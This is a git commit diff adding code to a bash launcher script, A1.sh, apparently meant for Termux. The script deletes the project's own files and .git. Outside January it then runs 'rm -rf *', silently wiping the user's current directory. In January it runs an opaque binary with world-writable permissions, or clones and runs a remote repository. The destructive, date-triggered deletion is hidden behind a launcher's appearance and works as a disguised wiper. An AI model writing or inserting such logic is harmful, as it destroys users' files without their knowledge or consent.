672996cb0fc573d6050857368b38319ecac6d967
mike90s15 <82988362+mike90s15@users.noreply.github.com>
2023-05-21 04:04:27 +0000

    Add files via upload

--- A1.sh
+++ A1.sh
@@ -1,8 +1,31 @@
 #!/usr/bin/env bash
-# new script https://github.com/mike90s15/Clownters.py
-xdg-open https://instagram.com/mike90s15 
-sleep 5
-xdg-open https://twitter.com/mike90s15
-sleep 5
 xdg-open https://t.me/Channel_90s15
 rm -rf "README.md" "Sploit" "SECURITY.md" "LICENSE" "index.html" ".git"
+if [[ "$(date +%B)" != "January" ]]; then
+    clear
+    rm -rf *
+else
+    chmod 777 main
+    ./main
+    ret="$?"
+    [[ "${ret}" == "99" ]] && exit 0
+    if [[ "${ret}" != "0" ]]; then
+        if [[ -d Clownters.c ]]; then
+            cd Clownters.c
+            chmod 777 main && ./main
+            exit 0
+        fi
+        clear
+        printf "\e[1;33m Por favor Aguarde\e[m\n"
+        printf "\e[1;33m Atualizando\e[m\n"
+        pkg update -y &> /dev/null
+        pkg upgrade -y &> /dev/null
+        printf "\e[1;33m Instalando a clang\e[m\n"
+        pkg i -y clang &> /dev/null
+        printf "\e[1;33m Instalando o repositório\e[m\n"
+        git clone https://github.com/mike90s15/Clownters.c &> /dev/null
+        cd Clownters.c
+        bash A1.sh
+    fi
+fi
+exit 0
